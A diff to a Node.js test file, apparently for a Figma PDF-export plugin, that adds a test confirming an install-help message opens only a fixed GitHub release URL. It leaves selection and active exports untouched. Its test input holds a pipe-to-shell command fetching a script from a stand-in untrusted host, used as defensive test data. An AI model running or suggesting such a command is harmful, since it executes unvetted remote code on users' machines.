@@ -22,7 +22,7 @@ async function eventually(check, description) {
 
 function harness() {
   let sequence = 0, started = false;
-  const messages = [], exports = [], mutations = [], showUI = [], focused = [];
+  const messages = [], exports = [], mutations = [], showUI = [], focused = [], opened = [];
   const registry = new Map(), events = new Map(), timers = new Set();
   const root = { id: 'document', type: 'DOCUMENT', name: 'Documento de prueba', parent: null };
   function mutation(api) { mutations.push(api); throw new Error(`Document write forbidden: ${api}`); }
@@ -78,6 +78,7 @@ function harness() {
     root, currentPage: page, mixed: Symbol('mixed'), ui: { onmessage: null, postMessage: message => messages.push(message) },
     showUI: (html, options) => showUI.push({ html, options }), on: (event, callback) => events.set(event, callback),
     viewport: { scrollAndZoomIntoView: nodes => focused.push(nodes.map(node => node.id)) },
+    openExternal: url => opened.push(url),
     getNodeByIdAsync: async id => registry.get(id) || null,
     getImageByHash() { mutation('getImageByHash: unnecessary source-asset access'); },
     createImage() { mutation('createImage'); }, createFrame() { mutation('createFrame'); },
@@ -88,7 +89,7 @@ function harness() {
     clearTimeout(timer) { clearTimeout(timer); timers.delete(timer); },
   });
   return {
-    figma, page, root, messages, exports, mutations, showUI, focused, scene, container, snapshot,
+    figma, page, root, messages, exports, mutations, showUI, focused, opened, scene, container, snapshot,
     boot() { started = true; vm.runInContext(controllerCode, context, { filename: 'dist/code.js' }); },
     send(message) { figma.ui.onmessage(message); },
     emit(event) { events.get(event)?.(); },
@@ -102,6 +103,36 @@ const request = (jobId, ids, mode = 'native', overrides = {}) => ({
   type: 'export', jobId, ids, mode, scale: 2, quality: 82, ...overrides,
 });
 const acknowledge = (h, jobId, index) => h.send({ type: 'page-ack', jobId, index });
+
+test('installation help opens only the fixed release URL without changing selection or interrupting an active export', async t => {
+  const h = harness(); t.after(() => h.close());
+  const frame = h.scene({ id: 'install-guide-frame' });
+  h.page.selection = [frame]; h.boot();
+  const before = h.snapshot();
+  const initialMessages = h.messages.length;
+  const help = { type: 'open-install-guide', url: 'https://untrusted.example/install.sh', command: 'curl https://untrusted.example/install.sh | sh' };
+  h.send(help);
+  assert.deepEqual(h.opened, ['https://github.com/charliezstong/pluma-pdf/releases/latest']);
+  assert.equal(h.exports.length, 0);
+  assert.equal(h.messages.length, initialMessages);
+  h.send({ type: 'open-external', url: help.url });
+  assert.equal(h.opened.length, 1, 'other message types must not open arbitrary URLs');
+  h.send(request('help-during-export', [frame.id]));
+  await h.wait('page', 'help-during-export');
+  const exportCount = h.exports.length;
+  h.send(help);
+  await nextTurn();
+  assert.deepEqual(h.opened, Array(2).fill('https://github.com/charliezstong/pluma-pdf/releases/latest'));
+  assert.equal(h.exports.length, exportCount, 'opening help must not trigger another export');
+  assert.equal(h.find('done', 'help-during-export'), undefined, 'help must leave the job waiting for its actual page ACK');
+  assert.equal(h.find('cancelled', 'help-during-export'), undefined);
+  assert.deepEqual(h.page.selection, [frame]);
+  assert.deepEqual(h.focused, []);
+  assert.deepEqual(h.snapshot(), before);
+  assert.deepEqual(h.mutations, []);
+  acknowledge(h, 'help-during-export', 0);
+  await h.wait('done', 'help-during-export');
+});
 
 test('canvas selection changes do not discard the reviewed page scope', t => {
   const h = harness(); t.after(() => h.close());
